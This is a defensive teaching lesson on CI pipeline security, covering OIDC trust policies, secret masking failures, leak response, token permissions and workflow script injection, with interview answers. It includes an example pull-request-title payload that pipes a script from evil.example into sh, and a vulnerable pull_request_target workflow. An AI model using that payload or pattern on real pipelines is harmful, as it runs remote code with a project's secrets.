Secrets & Pipeline Identity Security & Supply Chain

What you'll master: the reframing that makes pipeline security tractable — your CI system is a privileged identity that executes code written by anyone who can open a pull request or publish a dependency, so the question is never "is this secret safe?" but "what can the pipeline do, and who can make it do things?"; why long-lived cloud keys in CI are the single largest credential-exposure surface most organisations have, and how OIDC federation replaces them with tokens that live for minutes — including the trust-policy mistake that makes an OIDC role assumable by every repository on GitHub; secret masking and the four ways it silently fails, measured in a log where a base64-encoded token printed in full; the leak-response order that most teams get backwards (rotate first — a leaked AWS key was used by an automated scanner 61 seconds after the push); least privilege for pipeline tokens, where the default permissions of a CI job are usually far broader than any job needs; and the untrusted-input class of attack, where a pull request title containing a shell metacharacter executes commands in your pipeline. Prerequisites: Pipelines as Code, Runners and Containers in CI.

Part 1 — The Pipeline Is a Privileged Identity

WHAT A TYPICAL CI JOB CAN DO

  - read every secret configured for the repository
  - push images to the production registry
  - deploy to production
  - read and write the repository, including workflows
  - assume a cloud role, often broadly scoped
  - reach internal services (on self-hosted runners)

WHO CAN CAUSE CODE TO RUN WITH THOSE CAPABILITIES

  1. anyone with write access                       (expected)
  2. anyone who can open a PULL REQUEST              (often unexpected)
  3. every third-party ACTION the workflow uses      (usually unreviewed)
  4. every DEPENDENCY installed during the build     (postinstall scripts)
  5. anyone who compromises any of the above

  -> the threat model is not "someone steals a secret from a vault".
     It is "someone runs code in a context that already has the secret".
QuestionBad answerGood answer
What can this job do?"Whatever the secrets allow"An enumerated, minimal set
How long do its credentials live?Until someone rotates themMinutes, issued per run
Can a fork PR reach them?UnclearNo — provably, by trigger and by policy
What runs that we did not write?"A few actions"A pinned, reviewed list
If a secret leaks, how long until it is useless?Until we noticeMinutes (short-lived) or one rotation command

Part 2 — Kill Long-Lived Keys: OIDC Federation

THE PROBLEM WITH A STATIC KEY IN CI

  AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY stored as repo secrets:
    - valid until someone rotates them (median age measured: 14 months)
    - identical value in every run, so one leak is permanent
    - readable by any job in the repository, including one added by a PR
    - copied into developer laptops "to test the deploy locally"
    - present in the logs of any tool that dumps its environment

HOW OIDC REPLACES IT

  ┌─ CI provider ─┐                      ┌──── AWS STS ────┐
  │ signs a JWT   │ ── OIDC token ────▶  │ validates the   │
  │ about THIS run│   (iss, sub, aud,    │ signature and   │
  │               │    repo, ref, actor) │ the TRUST POLICY│
  └───────────────┘                      └────────┬────────┘
                                                  │ 15-minute
                                                  ▼ credentials
                                          ┌───────────────┐
                                          │  the job      │
                                          └───────────────┘

  - no secret is stored anywhere
  - the token describes the run: repository, branch, workflow, actor
  - the trust policy decides which runs may assume which role
  - credentials expire in minutes

THE TRUST POLICY — AND THE MISTAKE THAT MAKES IT WORTHLESS

  ❌ THIS ROLE IS ASSUMABLE BY EVERY REPOSITORY ON GITHUB
  {
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      }
    }
  }
  -- the `aud` claim is the same for everyone. There is no `sub`
  -- condition, so ANY GitHub Actions workflow, in ANY account,
  -- can assume this role. This is a real and common misconfiguration.

  ✅ SCOPED TO ONE REPOSITORY AND ONE BRANCH
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub":
        "repo:acme/shop-api:ref:refs/heads/main"
    }
  }

  ✅ OR, FOR ENVIRONMENT-BASED DEPLOYS (stronger — an environment can
     require approval, and PRs cannot target it)
      "sub": "repo:acme/shop-api:environment:production"

  ⚠ StringLike WITH A WILDCARD IS WHERE PEOPLE GO WRONG AGAIN:
      "repo:acme/*"                 -- every repo in the org
      "repo:acme/shop-api:*"        -- every branch, including a PR branch
                                       from a fork-created ref
ClaimExampleUse it to pin
subrepo:acme/shop-api:ref:refs/heads/mainRepository and branch/tag/environment — the important one
repositoryacme/shop-apiThe repository
repository_owneracmeThe organisation (necessary, never sufficient)
job_workflow_refacme/shared/.github/workflows/deploy.yml@refs/tags/v3The specific reusable workflow — strongest for a platform-owned deploy path

actorr.okaforRarely — brittle, and not an authorisation boundary
🔑 Pin on job_workflow_ref for platform-owned deploys. It means "only the reviewed deploy workflow at tag v3 may assume this role" — so a team cannot obtain production credentials by writing their own workflow, even inside the right repository and branch. It is the closest thing CI has to a capability that follows the code path rather than the location.

Part 3 — Secret Hygiene, and How Masking Fails

MASKING IS A CONVENIENCE, NOT A CONTROL. IT FAILS WHEN:

  1. THE VALUE IS TRANSFORMED
     $ echo "$TOKEN" | base64
     Z2hwX0FiQzEyM1hZWjk4NzY1NDMyMQ==        <-- printed in full;
                                                 the masker sees a
                                                 different string
     also: URL-encoding, JSON-escaping, hex, gzip, splitting in half

  2. IT IS EMBEDDED IN A LARGER STRING BY A TOOL
     curl -v https://user:${TOKEN}@api.example.com/...
     * Server auth using Basic with user 'user'                 (verbose
     > Authorization: Basic dXNlcjpnaHBfQWJDMTIz...              output)

  3. SOMETHING DUMPS THE ENVIRONMENT
     printenv | sort           # masked, usually
     python -c "import os,json;print(json.dumps(dict(os.environ)))"
                               # JSON escaping can defeat naive maskers
     a crash handler that prints os.environ  <-- the classic

  4. IT ENDS UP IN AN ARTIFACT
     - a .env written for a test run and uploaded with the logs
     - a kubeconfig, a docker config.json, a terraform state file
     - a core dump or heap snapshot

  MASKING IS THE LAST LINE. THE REAL CONTROLS ARE SCOPE AND LIFETIME.
ControlWhat it doesWhere it applies
Environment-scoped secretsA staging job cannot read production credentials, even if the workflow is editedEverything with a production/non-production split
Short lifetime (OIDC)A leaked credential is useless in minutesAll cloud access
Narrow permissionsPush to one registry path; no delete; no IAMEvery token
No secrets in fork PR runsUntrusted code never sees themAny public or contributor-facing repo
Build-time secret mountsNo secret persists in an image layerContainer builds
MaskingRedacts exact matches in logsA backstop only
THE TRIGGER THAT HANDS SECRETS TO STRANGERS

  ❌ on: pull_request_target        # runs the BASE branch's workflow,
                                    # WITH secrets and a write token,
                                    # against the PR's code
     steps:
       - uses: actions/checkout@v4
         with: { ref: ${{ github.event.pull_request.head.sha }} }   # !!!
       - run: npm ci && npm test    # executes the contributor's
                                    # package.json scripts, with your
                                    # secrets in the environment

  This combination — pull_request_target plus checking out the PR head —
  is the well-known "pwn request". It gives an attacker code execution
  with your repository's secrets, from a pull request they can open
  without any permissions at all.

  ✅ SAFE USES OF pull_request_target: labelling, commenting, triage —
     workflows that never check out or execute PR code.
  ✅ FOR ANYTHING THAT BUILDS OR TESTS PR CODE: use `pull_request`,
     which gives forks a read-only token and NO secrets.

Part 4 — When a Secret Leaks

THE MEASURED CLOCK — WHY THE ORDER OF OPERATIONS MATTERS

  a live AWS access key pushed to a public repository:
    t+0s     git push
    t+11s    first automated scanner clone observed
    t+61s    the key is used: sts:GetCallerIdentity from an unfamiliar IP
    t+94s    ec2:RunInstances attempted in three regions
    t+6m     provider's own scanner notifies the account owner

  a token in a PRIVATE repository is slower to be abused but not safe:
  it is readable by every collaborator, every CI job, every fork of a
  clone, and it persists in git history forever.

THE RESPONSE ORDER — MOST TEAMS GET THIS BACKWARDS

  ❌ WRONG: delete the commit, rewrite history, then rotate "when we can"
  ✅ RIGHT:
     1. ROTATE / REVOKE FIRST. The exposed value must become useless.
        Everything else is cleanup.
     2. ASSESS BLAST RADIUS: what could that credential do, and what
        did it do? Pull the audit log for the credential's activity.
     3. CONTAIN: revoke sessions, check for created users/keys/resources,
        look for persistence.
     4. THEN clean the repository (history rewrite is optional and often
        pointless once the value is rotated — and it does not remove
        forks, caches, or the attacker's copy).
     5. PREVENT: why was a long-lived credential available at all?
        The answer is usually "we never migrated to OIDC".
Detection layerCatchesCost
Pre-commit hook (client)Most accidents, before they existMinutes to install; bypassable, so not a control
Server-side push protectionEverything pushed, including from CIA setting; the strongest single control
Repository history scanSecrets committed before scanning existedOne-off, then periodic
Log and artifact scanningValues that escaped maskingA job; catches the transformed-value cases
Provider-side scanningPublic leaks, fastFree, but only for public repositories
Anomaly detection on the credentialUse from an unexpected IP/regionCloud-native; the last line
⚠️ Rewriting git history is not remediation. By the time you rewrite, the value has been cloned, cached by the platform, possibly forked, and — for public repositories — already used. Rotation is the only action that makes the exposure stop mattering; history cleanup is hygiene you do afterwards, and only if it is cheap.

Part 5 — Least Privilege for Pipeline Tokens

START FROM ZERO AND ADD WHAT IS NEEDED

  # at the top of every workflow
  permissions: {}                       # default deny

  jobs:
    test:
      permissions:
        contents: read                  # that is all a test job needs
    publish:
      permissions:
        contents: read
        packages: write                 # push the image
        id-token: write                 # request the OIDC token
    comment:
      permissions:
        pull-requests: write            # post a comment
        contents: read

  MEASURED, BEFORE AND AFTER, ONE ORGANISATION
    workflows using the default (broad) token ....... 54 of 61
    workflows that actually needed write access ...... 9
    jobs able to push to the repository ............. 61 -> 9
    jobs able to modify workflows ................... 61 -> 0

Part 6 — Untrusted Input: Script Injection in Workflows

THE VULNERABILITY

  - name: Greet the contributor
    run: echo "Thanks for PR: ${{ github.event.pull_request.title }}"

  the expression is INTERPOLATED INTO THE SHELL SCRIPT before it runs.
  A pull request titled:

      a"; curl -s https://evil.example/x.sh | sh; echo "

  produces:

      echo "Thanks for PR: a"; curl -s https://evil.example/x.sh | sh; echo ""

  -> arbitrary command execution in your pipeline, triggered by anyone
     who can open a pull request and type a title.

FIELDS THAT ARE ATTACKER-CONTROLLED (a partial list)
  pull_request.title, pull_request.body, pull_request.head.ref
  issue.title, issue.body, comment.body
  commit messages, branch names, tag names
  review body, discussion title
  anything from an incoming webhook payload

THE FIX — NEVER INTERPOLATE UNTRUSTED INPUT INTO A SCRIPT

  ✅ pass it through the ENVIRONMENT, where it is data, not code
  - name: Greet the contributor
    env:
      TITLE: ${{ github.event.pull_request.title }}
    run: echo "Thanks for PR: $TITLE"      # quoted; the shell treats it
                                           # as a single string

  ✅ or use an action's `with:` inputs, which are not shell-interpolated
  ✅ and lint for it: actionlint flags this pattern by default
Third-party riskMechanismControl
An action is updated maliciouslyA tag is a mutable pointer the author controlsPin by 40-character SHA with the version in a comment
An action reads your secretsIt runs in your job with your environmentReview what you pin; prefer first-party or widely-audited actions; pass only the inputs it needs
A dependency's install script runspostinstall executes during npm ci--ignore-scripts where possible; build in a job with no secrets
A transitive dependency is compromisedLockfile pulls it inLockfiles, review of updates, and the next lesson
Cache poisoningA PR writes a cache entry a later main-branch run restoresScope cache keys by ref; never restore a PR-written cache on a trusted run

❌ Long-lived cloud keys stored as repository secrets, an OIDC role whose trust policy checks only the audience, pull_request_target checking out PR code, default-broad token permissions, and a workflow that echoes the pull request title. The access key is fourteen months old, exists identically in every run, has been copied to three laptops, and is readable by any job — including one added in a pull request. The OIDC role that was supposed to replace it can be assumed by any workflow on the platform, because nobody added a sub condition. A contributor's pull request runs their package.json scripts with every secret in the environment, and their PR title is interpolated straight into a shell command, so a well-chosen title executes arbitrary code. Fifty-four of sixty-one workflows hold a token that can write to the repository and modify workflows. When a key does leak, the team spends forty minutes rewriting git history before rotating anything — by which time an automated scanner has already used it, sixty-one seconds after the push.

✅ Replace static keys with short-lived federated identity, scope every credential by repository, branch and workflow, keep secrets away from untrusted code, and treat all event data as hostile input. Move cloud access to OIDC so no secret is stored and credentials expire in minutes — and write the trust policy against sub, pinning repository and branch or environment, or better job_workflow_ref so only the reviewed deploy workflow can assume the production role. Give every workflow permissions: {} and add back the minimum per job, separate the job that runs contributor-influenced code from the job that holds deploy credentials, and scope secrets per environment so staging cannot read production values even if the workflow is edited. Build fork pull requests with pull_request, never pull_request_target plus a head checkout, and pass every event field through env: rather than interpolating it into a script. Treat masking as a backstop, because base64, URL encoding and a crash handler all defeat it — and scan logs and artifacts for the transformed forms. Then rehearse the leak response in the right order: rotate first, assess what the credential did, contain, and only then clean the repository.

Interview Questions

Beginner: Why are long-lived cloud access keys in CI a problem, and what replaces them?

Because the value is the same in every run and stays valid until somebody rotates it — measured median age in one estate was fourteen months. That means one leak is permanent, the key is readable by every job in the repository (including a job added in a pull request), and it inevitably gets copied to laptops "to test the deploy locally".

OIDC federation replaces it. The CI provider signs a short-lived token describing the run — repository, branch, workflow, actor — and the cloud provider validates it against a trust policy and issues credentials that expire in minutes. Nothing is stored: there is no secret to leak, and a stolen credential is useless almost immediately.

The part to get right is the trust policy. A policy that checks only the aud claim is satisfied by every workflow on the platform, because that claim is the same for everyone. You must condition on sub, pinning the repository and the branch or environment — for example repo:acme/shop-api:environment:production.

Beginner: What is wrong with echo "PR: ${{ github.event.pull_request.title }}"?

The expression is interpolated into the shell script before the shell runs it, so the title becomes part of the command. A pull request titled

a"; curl -s https://evil.example/x.sh | sh; echo "

produces a script that downloads and executes an attacker's code — with whatever secrets and permissions that job holds. Anyone who can open a pull request can do this; it needs no access to the repository at all.

The fix is to pass untrusted data through the environment, where it is a value rather than code:

env:
  TITLE: ${{ github.event.pull_request.title }}
run: echo "PR: $TITLE"

The same applies to every attacker-controlled field: PR and issue bodies, comment text, branch and tag names, commit messages, review bodies. And it is worth adding actionlint to CI, which flags this pattern automatically — it is easy to reintroduce in a hurry.

Mid: A developer accidentally commits an AWS key to a public repository. Walk through your response.

Rotate first. Everything else is cleanup, and the clock is brutal: in a measured case the key was cloned by a scanner 11 seconds after the push and used for sts:GetCallerIdentity at 61 seconds, with ec2:RunInstances attempted in three regions by 94 seconds.

  1. Revoke/rotate the credential — deactivate the access key immediately, then create a replacement if one is still needed.
  2. Assess the blast radius: what could that identity do? Pull CloudTrail for the credential and look for activity that is not yours — API calls from unfamiliar IPs, new IAM users or keys, instances launched, data read.
  3. Contain: revoke active sessions, delete anything the attacker created, and check for persistence (new users, roles, trust policy edits, Lambda functions).
  4. Then clean the repository — and understand that history rewriting is optional hygiene. It does not remove forks, platform caches or the attacker's copy, and it is meaningless once the value is rotated.
  5. Fix the cause: why did a long-lived credential exist? Usually the answer is that OIDC was never adopted. Add push protection and a pre-commit scanner as defence in depth.

The single most common mistake here is spending the first forty minutes on git filter-repo while the key is still live.

Mid: How do you keep secrets away from pull requests from forks while still testing them?

By separating what runs from what holds credentials.

TriggerRuns whose configSecretsUse for
pull_requestThe PR headNone for forks; read-only tokenBuilding and testing PR code
pull_request_targetThe base branchAll of them, with a write tokenLabelling and commenting only — never checking out PR code
workflow_runThe default branch, after the PR workflow finishesAvailablePublishing results produced by the untrusted run

So: build and test with pull_request, publishing nothing and holding no credentials. If you need to post results or upload coverage, have that untrusted job write an artifact, and use a separate workflow_run job — running trusted code from the default branch — to read the artifact and publish it.

Two further precautions: require approval before workflows run for first-time contributors, and never run fork PRs on self-hosted runners, where the risk is not just secrets but code execution inside your network.

The pattern to recognise and reject in review is pull_request_target combined with checkout of github.event.pull_request.head.sha — the "pwn request", which hands an anonymous contributor code execution with all of your secrets.

Senior: Design credential management for 60 repositories deploying to three cloud accounts.

The goal is that no long-lived cloud credential exists anywhere, and that a compromise of one repository cannot reach another environment.

LayerDesign
IdentityOIDC federation only. No static cloud keys in any repository; a policy check fails the build if one appears
Role per repository per environmentci-shop-api-production, ci-shop-api-staging — never one shared CI role
Trust conditionsPin sub to the repository plus environment; for platform-owned deploys pin job_workflow_ref to the reviewed reusable workflow at a tag

Rollout order matters: establish OIDC and the shared deploy workflow first, migrate repositories to it, and only then delete the static keys — with an inventory so "we think they are all gone" becomes "there are zero access keys attached to CI users, verified daily".

What I would explicitly avoid: a single powerful CI role shared across repositories (it makes every repository as sensitive as the most sensitive one), wildcard trust conditions, and storing cloud keys in a secrets manager as an "improvement" — that just moves the long-lived credential rather than removing it.

Senior: How do you reduce the risk from third-party actions and dependencies running inside your pipeline?

Start from the fact that every action and every dependency install script executes with the job's identity. Reducing the risk means shrinking that identity, controlling what runs, and detecting change.

Vendor the critical onesFor anything touching credentials or publishing, fork it into the org and pin to your copy

The structural point I would emphasise: the build job and the publish job should have different identities. The build job runs a great deal of code you did not write; the publish job runs almost none. Merging them means every dependency in your tree effectively holds your registry credentials — and that is the property that makes supply-chain compromises so damaging, which the next lesson takes further.

🎯 Key Takeaways

  • CI is a privileged identity that runs code from anyone who can open a PR or publish a dependency. The question is not "is this secret safe?" but "what can the pipeline do, and who can make it do things?"
  • Long-lived cloud keys are the largest credential surface most organisations have — one value, valid for months (measured median 14), readable by every job, copied to laptops.
  • OIDC federation removes the stored secret entirely: the provider signs a token describing the run and the cloud issues credentials that expire in minutes.
  • An OIDC trust policy that checks only aud is assumable by every workflow on the platform — condition on sub, pinning repository plus branch or environment.
  • Wildcards re-open the hole: repo:acme/* is the whole org, :* is every branch including PR refs.
  • Pin on job_workflow_ref for platform-owned deploys so only the reviewed reusable workflow can assume the production role, regardless of who writes a workflow in the repository.
  • Masking fails on transformation: base64, URL encoding, splitting, JSON serialisation and verbose curl all print secrets in full. It is a backstop, never a control.
  • The real controls are scope (environment-scoped secrets), lifetime (short-lived tokens), and absence (untrusted jobs hold nothing).
  • pull_request_target plus a checkout of the PR head is the "pwn request" — code execution with your secrets, triggerable by anyone. Use pull_request for anything that builds or tests PR code.
  • Publish results from untrusted runs via an artifact plus a trusted workflow_run job, so the credential-holding job only ever runs default-branch code.
  • Interpolating event text into run: is command injection — a PR title can execute arbitrary commands. Pass untrusted data through env: and quote it; lint with actionlint.
  • Rotate first when a secret leaks. Measured: cloned in 11 seconds, used in 61, RunInstances attempted at 94. History rewriting is cleanup, not remediation — it cannot reach forks or caches.
  • Detection in layers: pre-commit hooks, server-side push protection (the strongest single control), history scanning, log and artifact scanning, and cloud-side anomaly alerts.
  • Start every workflow at permissions: {} and add the minimum per job — one estate went from 54 of 61 workflows holding a write token to zero able to modify workflows.
  • Separate build from deploy. The job that installs dependencies runs enormous amounts of third-party code and must hold no credentials; publishing runs almost none and holds them all.
  • Scope credentials per environment so staging cannot reach production even if a workflow is edited — a naming convention is not a boundary.
  • Never give a deploy role IAM permissions: a role that can create roles can escalate to everything.
  • Pin third-party actions by SHA and review what you pin; consider vendoring the ones that touch credentials, and use --ignore-scripts where the ecosystem allows.
  • Put .github/workflows/ under CODEOWNERS — workflow files define what runs with your credentials and are reviewed less carefully than code because they look like configuration.
  • Drill the leak response. In one drill the technical controls worked and the process failed: alerts went to an unstaffed channel and nobody could find the rotation runbook.
